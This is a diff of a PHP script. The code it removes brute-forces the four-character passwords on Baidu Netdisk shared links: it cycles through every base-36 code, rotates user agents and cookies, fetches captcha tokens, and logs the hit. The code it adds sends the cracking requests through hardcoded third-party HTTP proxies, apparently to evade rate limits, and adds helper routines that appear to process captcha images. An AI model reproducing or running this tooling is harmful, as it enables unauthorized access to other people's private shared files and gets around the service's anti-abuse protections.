@@ -1,139 +1,22 @@
 <?php
-/*
- * http://pan.baidu.com/share/verify?shareid=1418533617&uk=242193955&t=时间戳+随机三位数&bdstoken=xxxxxxxx&channel=chunlei&clienttype=0&web=1&app_id=250528&logid=base64(时间戳+随机三位数+000.+随机15-20位数)
- */
 
-/* 共有167 9616个
-
-每秒钟10个，
-一分钟1000个，
-一小时6 0000个，
-十小时60 0000个，
-
-*/
-
-// 获取参数
-$data  = get_data();
-$surl  = get_arr($data, 'surl');      // 要破解的百度网盘资料的surl
-$start = intval(get_arr($data, 'start', 0));    // 从哪个数字开始验证密码
-$end   = intval(get_arr($data, 'end', 0));        // 验证到哪个密码
-$limit = intval(get_arr($data, 'limit', 0));      // 要破解的百度网盘资料的surl
-$sure  = intval(get_arr($data, 'sure', 0)); // 是否确认
-$error = intval(get_arr($data, 'error', 0)); //   总共有多少次请求失败就结束脚本
-
-if ( ! $surl)
+function get_ip()
 {
-	$note = <<<NOTE
-NOTE需要传递参数 
-sure：是否确认
-surl：要破解的surl
-start：从哪个数字开始
-end：到哪个数字结束
-limit：从开始的数字起验证多少位，如果与end参数冲突，以end参数为准，默认为1000
-error：总共有多少次失败的请求后就结束脚本，默认为100次，最大为1000次
-NOTE;
 
-	output($note);
-	die;
+	// http代理和https代理是不一样的
+//	curl_setopt($ch, CURLOPT_PROXY, $ip);
+//	curl_setopt($ch, CURLOPT_PROXYPORT, $port);
+////curl_setopt($ch, CURLOPT_PROXYUSERPWD, ":"); //http代理认证帐号，username:password的格式
+//	curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); //使用http代理模式
+
+	$ip_port = [
+		['120.55.61.182', '80'],
+		['219.138.58.42', '3128'],
+	];
+
+	return $ip_port[0];
 }
 
-set_time_limit(0);
-
-if ($error < 0 || $error > 1000)
-{
-	$error = 100;
-}
-
-if ($start < 0)
-{
-	$start = 0;
-}
-
-if ( ! $limit)
-{
-	$limit = 1000;
-}
-
-if ( ! $end)
-{
-	$end = $start + $limit;
-}
-
-if ($end > 1679616)
-{
-	$end = 1679616;
-}
-
-$url        = 'https://pan.baidu.com/share/init?surl='.$surl;
-$file       = $surl.'-'.$start.'-'.$end;
-$h          = init_file($file);
-$limit      = pow(36, 4);
-$user_agent = get_user_agent();
-$cookie_tmp = get_cookie($url, $user_agent);
-$vcode_str  = get_code($cookie_tmp);
-// i是验证码的计数，j 是每三次换一下user-agent，k是总共失败了多少次
-for ($i = $start, $j = 1, $k = 0; $i <= $end; $i ++, $j ++)
-{
-	if ($k > $error)
-	{
-		output('请求错误的次数已经超过上限：'.$k.' > '.$error);
-		die();
-		break;
-	}
-	if ($j % 4 == 0)
-	{
-		$j          = 1;
-		$user_agent = get_user_agent();
-		$cookie_tmp = get_cookie($url, $user_agent);
-		$vcode_str  = get_code($cookie_tmp);
-	}
-	$str = get_str($i);
-	ll($h, $i.'---'.$str, FALSE);
-	$result = get_pan($url, $cookie_tmp, $user_agent, $str, $vcode_str, $h);
-	$result = json_decode(trim($result), TRUE);
-	$re     = FALSE;
-	if ( ! $result)
-	{
-		$k ++;
-		$j                    = 3;
-		$result['user-agent'] = $user_agent;
-	}
-	ll($h, $result, TRUE);
-	if ( ! is_array($result) || ! isset($result['errno']))
-	{
-		$result['errno'] = 9999;
-	}
-	switch ($result['errno'])
-	{
-		case 0:
-			$re = TRUE;
-			break;
-		case - 9:
-			break;
-//		case - 62:
-//			// 请求验证码
-////			output($headers);
-//			output($result);
-////			$code      = get_code($cookie_tmp);
-////			$vcode_str = $code['vcode_str'];
-////			get_pan($url, $cookie_tmp, $user_agent, $pwd, $vcode_str);
-////			output($code);
-//			die('end reason:62');
-//
-//			break;
-		default:
-			$i --;
-			break;
-	}
-	if ($re)
-	{
-		ll($h, $i.'::::::ok::::::::'.$str);
-		break;
-	}
-}
-
-close_file($h);
-die('script is over. ok!');
 function get_str($i)
 {
 	$n   = base_convert($i, 10, 36);
@@ -144,7 +27,7 @@ function get_str($i)
 	return $str;
 }
 
-function get_cookie($url, $user_agent)
+function get_cookie($url, $user_agent, $ip, $port)
 {
 	// 根据地址获取百度网盘的真正地址
 	$ch = curl_init($url);
@@ -157,13 +40,21 @@ function get_cookie($url, $user_agent)
 		'Upgrade-Insecure-Requests:1',
 		'User-Agent:'.$user_agent,
 	]);
-	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
+//	curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 2);
+//	curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); // 跳过证书检查
 	// 只获取响应头就行了
 	curl_setopt($ch, CURLOPT_HEADER, TRUE);
 	curl_setopt($ch, CURLOPT_NOBODY, TRUE);
+
+	curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_BASIC); //代理认证模式
+	curl_setopt($ch, CURLOPT_PROXY, $ip.':'.$port);
+//	curl_setopt($ch, CURLOPT_PROXYPORT, $port);
+////curl_setopt($ch, CURLOPT_PROXYUSERPWD, ":"); //http代理认证帐号，username:password的格式
+	curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); //使用http代理模式
+
 	curl_setopt($ch, CURLOPT_REFERER, $url);
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
-	curl_setopt($ch, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
+	curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 设置超时限制防止死循环
 	$result = curl_exec($ch);
 
 	// 获得响应结果里的：头大小
@@ -188,7 +79,7 @@ function get_cookie($url, $user_agent)
 	return $cookie_tmp;
 }
 
-function get_pan($url, $cookie_tmp, $user_agent, $pwd = '', $vcode_str = '', $h)
+function get_pan($url, $cookie_tmp, $user_agent, $pwd = '', $vcode_str = '', $h, $ip, $port)
 {
 	/*if ($headers['Set-Cookie'])
 	{
@@ -214,7 +105,7 @@ function get_pan($url, $cookie_tmp, $user_agent, $pwd = '', $vcode_str = '', $h)
 		'vcode_str' => $vcode_str,
 	];
 	$data       = http_build_query($data);
-	$verify_url = 'https://pan.baidu.com/share/verify?';
+	$verify_url = 'http://pan.baidu.com/share/verify?';
 	$verify_url .= 'surl='.$surl;
 	$verify_url .= '&t='.$t;
 	$verify_url .= '&bdstoken=null';
@@ -246,11 +137,18 @@ function get_pan($url, $cookie_tmp, $user_agent, $pwd = '', $vcode_str = '', $h)
 	curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
 	curl_setopt($ch, CURLOPT_POST, TRUE);
 	curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+
+	curl_setopt($ch, CURLOPT_PROXY, $ip);
+	curl_setopt($ch, CURLOPT_PROXYPORT, $port);
+//curl_setopt($ch, CURLOPT_PROXYUSERPWD, ":"); //http代理认证帐号，username:password的格式
+	curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP); //使用http代理模式
+
 //	curl_setopt($ch, CURLOPT_HTTPHEADER, array('Accept-Encoding: gzip, deflate'));
 	curl_setopt($ch, CURLOPT_ENCODING, 'gzip,deflate');
 	curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
-	curl_setopt($ch, CURLOPT_TIMEOUT, 30); // 设置超时限制防止死循环
+	curl_setopt($ch, CURLOPT_TIMEOUT, 5); // 设置超时限制防止死循环
 	$result = curl_exec($ch);
+
 	// 获得响应结果里的：头大小
 //	$headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
 	// 根据头大小去获取头信息内容
@@ -331,7 +229,7 @@ function get_pan($url, $cookie_tmp, $user_agent, $pwd = '', $vcode_str = '', $h)
 		 */
 }
 
-function get_code($cookie)
+function get_code($cookie, $ip, $port)
 {
 	$curl = curl_init();
 	curl_setopt_array($curl, array(
@@ -339,9 +237,13 @@ function get_code($cookie)
 		CURLOPT_RETURNTRANSFER => TRUE,
 		CURLOPT_SSL_VERIFYHOST => 0,
 		CURLOPT_SSL_VERIFYPEER => 0,
+		CURLOPT_PROXY          => $ip,
+		CURLOPT_PROXYPORT      => $port,
+		//curl_setopt($ch, CURLOPT_PROXYUSERPWD, ":"); //http代理认证帐号，username:password的格式
+		CURLOPT_PROXYTYPE      => CURLPROXY_HTTP, //使用http代理模式
 		CURLOPT_ENCODING       => "",
 		CURLOPT_MAXREDIRS      => 10,
-		CURLOPT_TIMEOUT        => 30,
+		CURLOPT_TIMEOUT        => 5,
 		CURLOPT_HTTP_VERSION   => CURL_HTTP_VERSION_1_1,
 		CURLOPT_CUSTOMREQUEST  => "GET",
 		CURLOPT_HTTPHEADER     => array(
@@ -461,10 +363,17 @@ function output($string)
 	{
 		echo $string;
 	}
-	echo PHP_EOL;
-	//echo '<br/>';
-	//ob_flush();
-	flush();
+
+	if (is_cli())
+	{
+		echo PHP_EOL;
+		flush();
+	}
+	else
+	{
+		echo '<br/>';
+		ob_flush();
+	}
 }
 
 function init_file($surl)
@@ -500,15 +409,40 @@ function close_file($h)
 	fclose($h);
 }
 
-function get_data()
+function change_file($surl, $start, $end_old, $end_new)
+{
+	$file_old = $surl.'-'.$start.'-'.$end_old;
+	$file_new = $surl.'-'.$start.'-'.$end_new;
+	$old      = __DIR__.'/'.$file_old.'.txt';
+	$new      = __DIR__.'/'.$file_new.'.txt';
+	output('old:'.$old.'--new:'.$new);
+	if (file_exists($old))
+	{
+		if (file_exists($new))
+		{
+			rename($new, $new.'.bak');
+		}
+		else
+		{
+			rename($old, $new);
+		}
+	}
+}
+
+function is_cli()
 {
 	// 是否是cli 模式下的
 	$sapi_type = php_sapi_name();
 	$is_cli    = (substr($sapi_type, 0, 3) == 'cgi') ? FALSE : TRUE;
 
+	return $is_cli;
+}
+
+function get_data()
+{
 	$data = [];
 
-	if ($is_cli)
+	if (is_cli())
 	{
 		// $_SERVER['argv']里面保存的就是脚本的参数，那么需要
 		$argv = $_SERVER['argv'];
@@ -546,3 +480,177 @@ function get_arr(array $arr, $key, $default = NULL)
 
 	return $default;
 }
+
+function echo_arr($result)
+{
+	foreach ($result as $one)
+	{
+		foreach ($one as $item)
+		{
+			echo $item;
+		}
+		echo is_cli() ? "\n" : '<br/>';
+	}
+}
+
+function change_arr($result)
+{
+	$tmp_result = [];
+	foreach ($result as $h => $item)
+	{
+		foreach ($item as $l => $v)
+		{
+			$tmp_result[$l][$h] = $v;
+		}
+	}
+
+	return $tmp_result;
+}
+
+function delete_arr_top_and_bottom($result, $full, $empty)
+{
+	$ii         = count($result);
+	$jj         = count($result[0]);
+	$z          = 0;
+	$new_result = [];
+	$break      = FALSE;
+	for ($i = 0; $i < $ii; $i ++)
+	{
+		if ($break)
+		{
+			$new_result[$z ++] = $result[$i];
+		}
+		else
+		{
+			if (in_array($full, $result[$i]))
+			{
+				$break = TRUE;
+				for ($j = 0; $j < $jj; $j ++)
+				{
+					if ($result[$i][$j] == $full)
+					{
+						$new_result[$z][$j] = $full;
+					}
+					else
+					{
+						$new_result[$z][$j] = $empty;
+					}
+				}
+				$z ++;
+			}
+		}
+	}
+	$result = $new_result;
+
+	$ii     = count($result);
+	$bottom = 0;
+	for ($i = $ii - 1; $i > 0; $i --)
+	{
+		if (in_array($full, $result[$i]))
+		{
+			$bottom = $i;
+			break;
+		}
+	}
+
+	for ($i = $bottom + 1; $i < $ii; $i ++)
+	{
+		unset($result[$i]);
+	}
+
+	return $result;
+}
+
+function fill_black_in_empty_line($result, $full, $fill)
+{
+	$ii = count($result);
+	$jj = count($result[0]);
+
+	for ($i = 0; $i < $ii; $i ++)
+	{
+		if ( ! in_array($full, $result[$i]))
+		{
+			for ($j = 0; $j < $jj; $j ++)
+			{
+				$result[$i][$j] = $fill;
+			}
+		}
+	}
+
+	return $result;
+}
+
+function arr_to_str($arr)
+{
+	$str = '';
+	foreach ($arr as $item)
+	{
+		foreach ($item as $v)
+		{
+			$str .= $v;
+		}
+	}
+
+	return $str;
+}
+
+function delete_empty_line($result, $full, $empty)
+{
+	$hid = count($result);
+	$wid = count($result[0]);
+
+// 行列互换，然后就可以用去掉空行的方法来去掉空列
+//	$result = change_arr($result);
+
+// 去掉空行
+	$z          = 0; // 新的行号
+	$new_result = [];
+	for ($i = 0; $i < $hid; $i ++)
+	{
+		// 如果该行存在有效值，那么保留该行
+		if (in_array($full, $result[$i]))
+		{
+			$z ++;
+			for ($j = 0; $j < $wid; ++ $j)
+			{
+				if ($result[$i][$j] == $full)
+				{
+					$new_result[$z][$j] = $full;
+				}
+				else
+				{
+					$new_result[$z][$j] = $empty;
+				}
+			}
+		}
+	}
+
+	return $new_result;
+}
+
+function fill_empty_line($result, $full, $fill)
+{
+	$hid = count($result);
+	$wid = count($result[0]);
+	// 判断某一列都是-的话，就是
+	for ($j = 0; $j < $wid; ++ $j)
+	{
+		$all = TRUE;
+		for ($i = 0; $i < $hid; $i ++)
+		{
+			if ($result[$i][$j] == $full)
+			{
+				$all = FALSE;
+				break;
+			}
+		}
+		if ($all)
+		{
+			for ($i = 0; $i < $hid; $i ++)
+			{
+				$result[$i][$j] = $fill;
+			}
+		}
+	}
+}
+
